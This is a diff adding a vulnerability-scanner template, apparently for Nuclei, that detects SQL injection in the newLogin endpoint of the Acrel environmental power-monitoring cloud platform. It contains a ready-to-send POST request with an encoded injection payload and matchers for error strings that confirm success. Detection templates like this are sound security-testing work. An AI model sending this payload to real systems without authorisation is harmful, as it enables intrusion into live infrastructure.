@@ -1,0 +1,27 @@
+id: poc-yaml-acreldny-newlogin-sqli
+info:
+  name: 安科瑞环保用电监管云平台 newLogin SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in the newLogin functionality of 安科瑞环保用电监管云平台.
+http:
+  - raw:
+      - |
+        POST /Home/newLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        data=AmILgROn2omEYq%2Bd8Urox8DW%2F8rRQwsBzOEz00K3cyMY1DhHq6oDzKni9uNo6p7VIuEZBk0edl%2Blr8MukZeYaoj5ogyFWf1wJQ6iDSwIHOKSdk2%2BRRo%2FbhB70T5AlQ3PB6Ca1I6PvvVefK%2BuEF6b%2BqnvUH5y0gix7tq3yw1WJdc%3D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "系统异常"
+          - "XPATH syntax error"
+          - "c4ca4238a0b923820dcc509a6f75849"
